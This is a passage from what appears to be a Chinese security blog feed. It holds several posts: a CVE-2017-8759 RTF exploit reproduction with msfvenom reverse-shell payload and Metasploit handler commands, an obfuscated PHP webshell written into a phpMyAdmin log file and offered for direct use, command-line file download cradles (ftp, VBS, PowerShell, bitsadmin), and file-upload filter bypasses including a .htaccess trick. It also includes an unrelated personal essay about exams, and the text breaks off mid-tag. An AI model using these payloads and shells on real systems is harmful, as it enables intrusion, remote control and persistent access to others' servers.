src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/02.png" alt="CVE-2017-8759漏洞复现"></p><pre><code class="hljs markdown"><span class="hljs-section">###### Example commands</span><span class="hljs-code">1) Generate malicious RTF file</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.txt</span><span class="hljs-code">2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler</span><span class="hljs-code">   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe &gt; /tmp/shell.exe</span><span class="hljs-code">   # msfconsole -x &quot;use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run&quot;</span><span class="hljs-code">3) Start toolkit in exploit mode to deliver local payload</span><span class="hljs-code">   # python cve-2017-8759_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe</span></code></pre><p>我们先用命令<code>python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.0.124/test.txt</code>生成一个恶意的RTF文件(先用ifconfig命令查看下自己的IP，将里面的IP修改为自己的IP，我这里是192.168.0.124)</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/03.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到生成成功了，我们ls看下是否有这个文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/04.png" alt="CVE-2017-8759漏洞复现"></p><p>然后第二步，用msf生成Payload。</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=你监听的端口 -f exe &gt; /tmp/shell.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/05.png" alt="CVE-2017-8759漏洞复现"></p><p>然后用msfconsole启动msf，需要等待些时间。</p><p>等启动好后我们配置下msf</p><pre><code class="hljs gams">msf &gt; use exploit/multi/handler msf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>[-] The <span class="hljs-comment">value specified for payload is not valid.</span>msf <span class="hljs-comment">exploit(handler) &gt; set payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST                      <span class="hljs-comment">yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; set lhost 192.168.0.124</span>lhost <span class="hljs-comment">=&gt; 192.168.0.124</span>msf <span class="hljs-comment">exploit(handler) &gt; set lport 4444</span>lport <span class="hljs-comment">=&gt; 4444</span>msf <span class="hljs-comment">exploit(handler) &gt; show options</span> Module <span class="hljs-comment">options (exploit</span>/multi/<span class="hljs-comment">handler):</span>   Name  <span class="hljs-comment">Current Setting  Required  Description</span>   ----  ---------------  --------  -----------Payload <span class="hljs-comment">options (windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp):</span>   Name      <span class="hljs-comment">Current Setting  Required  Description</span>   ----      ---------------  --------  -----------   EXITFUNC  <span class="hljs-comment">process          yes       Exit technique (Accepted:</span> <span class="hljs-comment">&#x27;&#x27;</span><span class="hljs-comment">, seh, thread, process, none)</span>   LHOST     <span class="hljs-comment">192.168.0.124    yes       The listen address</span>   LPORT     <span class="hljs-comment">4444             yes       The listen port</span>Exploit <span class="hljs-comment">target:</span>   Id  <span class="hljs-comment">Name</span>   --  ----   0   Wildcard <span class="hljs-comment">Target</span>msf <span class="hljs-comment">exploit(handler) &gt; exploit</span> [*] Exploit <span class="hljs-comment">running as background job 0.</span>[*] Started <span class="hljs-comment">reverse TCP handler on 192.168.0.124:4444</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/06.png" alt="CVE-2017-8759漏洞复现"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/07.png" alt="CVE-2017-8759漏洞复现"></p><p>监听成功，我们进行最后一步</p><p><code>python cve-2017-8759_toolkit.py -M exp -e http://192.168.0.124/shell.exe -l /tmp/shell.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/08.png" alt="CVE-2017-8759漏洞复现"></p><p>我们把rtf文件拖动到win7虚拟机下打开</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/09.png" alt="CVE-2017-8759漏洞复现"></p><p>可以看到有反弹回来的信息了，不过貌似这系统的msf有问题，卡在那了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="CVE-2017-8759漏洞复现"></p><p>我们按ctrl+c停止，再session -l查看下会话列表</p><p>session -i选择会话</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170920_CVE-2017-8759%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="CVE-2017-8759漏洞复现"></p><p>成功，接下来怎么玩，我相信各位大佬比我清楚。</p><p>有POC就是牛逼。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>CVE-2017-8759</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>又是一年高考季</title>
    <link href="/p/6c3385c5.html"/>
    <url>/p/6c3385c5.html</url>
    
    <content type="html"><![CDATA[<p>写个文章也算是打发下时间吧！</p><p>一转眼又过去了2年了，想想两年前的自己，浑浑噩噩的混完了高中。</p><p>依稀记得高考前一晚还差点和别人打架，具体原因也是因为那几个要好的朋友。</p><p>虽然现在很少联系，但他们一直都在心中。</p><p>高考的前几天，我们一起在走廊上感概，我们的高中经历了什么，一转眼就没了，也许到现在我们都没法得到答案。</p><a id="more"></a><p>虽然现在可以吹牛逼说自己高考考了211。别在意，我说的211是分数，不是学校。</p><p>出成绩那天，查完成绩的我仿佛和中彩票一样高兴。</p><p>记得数学是29，这是一个意外的分数，也许是自己隐藏实力太久了吧。</p><p>高中老师都说，大学会很轻松。但愿你不会抱着这种美好的幻想，我会告诉你，都是假的。</p><p>大学给了你疯的时间与机会，却没给你能够陪你一起疯的那群人。</p><p>大学给了我自由恋爱随心所欲的空间和时间，可是我却没有了喜欢的人。</p><p>大学吃饭是一帮人，玩游戏是一帮人，出去玩又是一帮人，而高中这些都是同一帮人。</p><p>关于大学的室友，能忍就忍吧，毕竟要在一起相处三年。</p><p>但是，如果遇到那种大半夜打游戏，还开声音的人，你应该知道怎么做的。</p><p>就像我们宿舍有几个，凌晨4点多还在那打游戏。</p><p>曾经的六人间，变成了现在的二人间。</p><p>一定要上个好大学，真的，好的大学才会让你感受到大学的意义，而辣鸡的大学只是在浪费青春。</p><p>题再难也就高中水平，高考再难顶多也就3天。</p><p>嗯，最后的话。</p><p>喜欢的人能告白还是告白了吧，最起码以后也不遗憾。讨厌的老师该原谅也就原谅了吧，毕竟也是陪你从高三闯出来的人。最好的朋友一定要有完美的告别，要么就保持关系不断。想哭就哭一场吧，这样的日子不多了。校服还是留着吧，这是真正意义上的青春。现在走在大街上，看到穿校服的会很羡慕，感觉那就是青春吧。</p><p>2017届考生，祝好运。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpmyadmin新姿势getshell</title>
    <link href="/p/588d5ec8.html"/>
    <url>/p/588d5ec8.html</url>
    
    <content type="html"><![CDATA[<h3 id="mysql中的Into-outfile禁用的情况下，我该如何getshell？"><a href="#mysql中的Into-outfile禁用的情况下，我该如何getshell？" class="headerlink" title="mysql中的Into outfile禁用的情况下，我该如何getshell？"></a>mysql中的Into outfile禁用的情况下，我该如何getshell？</h3><p>目前<code>into outfile</code>被禁用</p><p>那么我们尝试通过一个脑洞大开的方法去getshell。</p><p><code>（必须是mysql root权限）</code></p><p>登录phpmyadmin后，查看全局变量：找到<code>general log和general log file</code></p><p><code>general log file</code>是存储了每一个sql语句执行的日志（包含SQL语句本身）</p><a id="more"></a><p>但是<code>general log</code>变量必须是<code>ON</code>状态，代表启用，然后再去更改</p><p><code>general log file</code>的地址为我们的webshell，绝对路径。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/01.png" alt="phpmyadmin新姿势getshell"></p><p>在每一次更改<code>general log file</code>的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。</p><p>此时该文件已经创建，并且文件内容保存了最后一条SQL语句的日志信息。</p><pre><code class="hljs mysql">MySQLa, Version: 5.5.53 (MySQL Community Server (GPL)). started with: TCP Port: 3306, Named Pipe: MySQL Time Id Command Argument 121 Query SHOW GLOBAL VARIABLES WHERE Variable_name&#x3D;&quot;general_log_file&quot; 121 Quit</code></pre><p>接下来，我们直接随意查询SQL，每一句都会被写入这个ice.php</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/02.png" alt="phpmyadmin新姿势getshell"></p><p>下面再附上一个SQL查询免杀shell的语句，方便大家遇到此类情况直接利用：</p><pre><code class="hljs php">SELECT <span class="hljs-string">&quot;&lt;?php</span><span class="hljs-string"><span class="hljs-subst">$p</span> = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,</span><span class="hljs-string">#afffffffff</span><span class="hljs-string">&#x27;pffff&#x27;=&gt;&#x27;s&#x27;/*223* 1*/,</span><span class="hljs-string">&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(</span><span class="hljs-string">&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,//FJKSJKFSNMFSSDSDS//D*SA/*DSA&amp;*$@&amp;$@&amp;(#*(;</span><span class="hljs-string">&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;//&amp;$@&amp;(#*(;</span><span class="hljs-string">);//&amp;$@&amp;(#*(;</span><span class="hljs-string"><span class="hljs-subst">$a</span> = array_keys(<span class="hljs-subst">$p</span>);//9*9*5656</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=<span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].#/*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*/</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;pffff&#x27;].<span class="hljs-subst">$a</span>[2];</span><span class="hljs-string">@<span class="hljs-subst">$_</span>=#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;f&#x27;]./*-/*-*/<span class="hljs-subst">$_</span>.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string"><span class="hljs-subst">$p</span>[&#x27;lfaaaa&#x27;].<span class="hljs-subst">$p</span>[&#x27;nnnnn&#x27;];#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">@<span class="hljs-subst">$_</span>#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">(<span class="hljs-subst">$_REQUEST</span>[#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">&#x27;username&#x27;#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="hljs-string">]);</span><span class="hljs-string">?&gt;&quot;</span></code></pre><p>密码username</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20170317_phpmyadmin%E6%96%B0%E5%A7%BF%E5%8A%BFgetshell/03.png" alt="phpmyadmin新姿势getshell"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>PHPMYADMIN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmd下几种常见的下载文件的办法</title>
    <link href="/p/cd8ce2bf.html"/>
    <url>/p/cd8ce2bf.html</url>
    
    <content type="html"><![CDATA[<p>好久没更新博客了 是时候来加快脚步成长了  接下来慢慢 会更新些笔记</p><h3 id="win-03安装ftp服务"><a href="#win-03安装ftp服务" class="headerlink" title="win 03安装ftp服务"></a>win 03安装ftp服务</h3><p>先在我虚拟机里把ftp安装好 win2003的  打开 控制面板-添加或删除程序-添加、删除组件–应用程序服务器（详细信息）–iis信息服务器（详细信息）–ftp 服务</p><h3 id="1-ftp"><a href="#1-ftp" class="headerlink" title="1.ftp"></a>1.ftp</h3><p>ip：192.168.68.132</p><p>文件：test.txt</p><p>按顺序执行如下代码即可通过ftp来下载文件</p><p>cmd：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> open <span class="hljs-number">192.168</span>.<span class="hljs-number">68.132</span> <span class="hljs-number">21</span>&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> ftp&gt;&gt; ftp.txt<span class="hljs-built_in">echo</span> GET test.txt &gt;&gt; ftp.txtftp <span class="hljs-literal">-s</span>:ftp.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/01.png" alt="cmd下几种常见的下载文件的办法"></p><a id="more"></a><h3 id="2-vbs"><a href="#2-vbs" class="headerlink" title="2.vbs"></a>2.vbs</h3><p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象</p><p>如下代码保存为.vbs文件：</p><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> Post = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>)<span class="hljs-keyword">Set</span> Shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span>Post.Send()<span class="hljs-keyword">Set</span> aGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>)aGet.Mode = <span class="hljs-number">3</span>aGet.Type = <span class="hljs-number">1</span>aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span></code></pre><p>对应到cmd下的命令为：</p><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Post = CreateObject(<span class="hljs-string">&quot;Msxml2.XMLHTTP&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> Shell = CreateObject(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://192.168.68.132/test.txt&quot;</span>,<span class="hljs-number">0</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> Post.Send() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> aGet = CreateObject(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Mode = <span class="hljs-number">3</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Type = <span class="hljs-number">1</span> &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Open() &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.Write(Post.responseBody) &gt;&gt;download.vbs<span class="hljs-built_in">echo</span> aGet.SaveToFile <span class="hljs-string">&quot;C:\test\update\test.txt&quot;</span>,<span class="hljs-number">2</span> &gt;&gt;download.vbs</code></pre><h3 id="3-powershell"><a href="#3-powershell" class="headerlink" title="3.powershell"></a>3.powershell</h3><p>cmd：</p><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.68.132/test.txt&#x27;</span>,<span class="hljs-string">&#x27;C:\Users\isky\Downloads\test.txt&#x27;</span>)</code></pre><h3 id="4-bitsadmin"><a href="#4-bitsadmin" class="headerlink" title="4.bitsadmin"></a>4.bitsadmin</h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带</p><p>使用方法：</p><p>cmd下：</p><pre><code class="hljs powershell">bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\Users\isky\Downloads\PSTools.zip</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20170314_cmd%E4%B8%8B%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9E%E6%B3%95/02.png" alt="cmd下几种常见的下载文件的办法"></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过姿势总结</title>
    <link href="/p/bfca3976.html"/>
    <url>/p/bfca3976.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/01.png" alt="文件上传绕过姿势总结"></p><h1 id="0x00-上传流程概述"><a href="#0x00-上传流程概述" class="headerlink" title="0x00 上传流程概述"></a>0x00 上传流程概述</h1><p>一个文件以http协议上传的时候，将以post请求发送至web服务器。服务器接受并同意后，用户与web服务器建立连接，并且传输数据</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/02.png" alt="文件上传绕过姿势总结"></p><p>而一般文件上传过程中检测部分由</p><ul><li><p>A 客户端javascript检测 （检测文件扩展名）</p></li><li><p>B 服务端MIME类型检测 （检测Content—Type）</p></li><li><p>C 服务端目录路径检测（检测和path相关参数）</p></li><li><p>D 服务端文件扩展名检测 （检测文件扩展名）</p></li><li><p>E 服务端内容检测 （检测是否含有恶意代码）</p><a id="more"></a></li></ul><h1 id="0x01-客户端检测绕过检测-（js检测）"><a href="#0x01-客户端检测绕过检测-（js检测）" class="headerlink" title="0x01 客户端检测绕过检测 （js检测）"></a>0x01 客户端检测绕过检测 （js检测）</h1><p>这一类型特征就是你会收到一个<code>javascript</code>的弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/03.png" alt="文件上传绕过姿势总结"></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>利用<code>firebug</code>禁用js<br>通过<code>brup</code>等代理工具</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/24.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/25.png" alt="文件上传绕过姿势总结"><br>即可成功上传</p><h1 id="0x02-服务端检测绕过-（MIME检测）"><a href="#0x02-服务端检测绕过-（MIME检测）" class="headerlink" title="0x02 服务端检测绕过 （MIME检测）"></a>0x02 服务端检测绕过 （MIME检测）</h1><p>一般来说界面如图</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/04.png" alt="文件上传绕过姿势总结"></p><p>源码类似如下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/26.png" alt="文件上传绕过姿势总结"></p><p>可以看到里面仅仅只判断了 <code>Content-Type</code></p><h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><p>通过<code>brup</code>等代理工具</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/05.png" alt="文件上传绕过姿势总结"></p><h1 id="0x03-服务端检测绕过-（扩展名检测）"><a href="#0x03-服务端检测绕过-（扩展名检测）" class="headerlink" title="0x03 服务端检测绕过 （扩展名检测）"></a>0x03 服务端检测绕过 （扩展名检测）</h1><p>常常采用一个黑名单或者白名单，对上传的文件的扩展名进行检测，符合条件才允许上传</p><h2 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h3><p>如果，在代码层没有进行大小写统一，用AsP，pHp类似的文件名绕过黑名单</p><h3 id="名单列表绕过"><a href="#名单列表绕过" class="headerlink" title="名单列表绕过"></a>名单列表绕过</h3><p>利用黑名单里没有的，并且能够成功执行的命名，进行绕过，例如php3，php4之类的<br>白名单，截断绕过</p><h3 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a>特殊文件名绕过</h3><p>在windows下有些文件名是不被允许的，将http包里将文件名改为<code>test.asp.</code>或<code>test.asp_</code>（此处下划线为空格）这种命名方式在windows系统自动去掉点和空格</p><h3 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h3><p>0x00截断绕过，在asp程序有这种漏洞<br>传入name=<code>test.jpg0x00</code><br>type=gettype(name) 此处该函数处理方式从后往前扫描，因为0x00不是扩展名，然后获得出来的文件名即是<code>.jpg</code><br>if（type==jpg）<br>savefiletopath（uploadpath.name，name）但在此处0x00截断最后存入磁盘的是<code>test.jpg</code></p><h3 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h3><p>在apache里，这个文件作为一个配置文件，可以用来控制所在目录的访问权限以及解析设置。即是，可以通过设置可以将该目录下的所有文件作为php文件来解析，即可绕过</p><h4 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h4><p>利用某些写文件函数复写<code>.htaccess</code>文件，即可任意定义解析名单<br>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”haha”这个字符串的<br>任意文件，所以无论文件名是什么样子，只要包含”haha”这个字符串，都可以被以 php 的方<br>式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很<br>多上传验证机制<br>建立一个<code>.htaccess</code>文件内容如下</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">haha</span>&quot;&gt;</span>SetHandler application/x-httpd-php<span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/06.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/07.png" alt="文件上传绕过姿势总结"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20161209_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/08.png" alt="文件上传绕过姿势总结"></p><h1 id="0x04-服务端检测绕过（文件内容检测）"><a href="#0x04-服务端检测绕过（文件内容检测）" class="headerlink" title="0x04 服务端检测绕过（文件内容检测）"></a>0x04 服务端检测绕过（文件内容检测）</h1><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><ul><li>jpg文件头</li></ul><p><img 